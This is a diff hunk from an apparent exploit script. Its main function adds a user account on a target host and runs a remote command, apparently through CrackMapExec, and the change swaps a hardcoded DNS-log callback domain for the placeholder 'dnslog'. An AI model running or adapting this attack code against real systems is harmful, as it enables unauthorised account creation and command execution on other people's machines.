@@ -75,7 +75,7 @@ def cme_exec(target, command, version):
 
 def main():
     target = sys.argv[1]
-    command = '"ping ak.1.logs.cf"'
+    command = '"ping dnslog"'
     version = get_version(target)
     add_user(target)
     cme_exec(target, command, version)
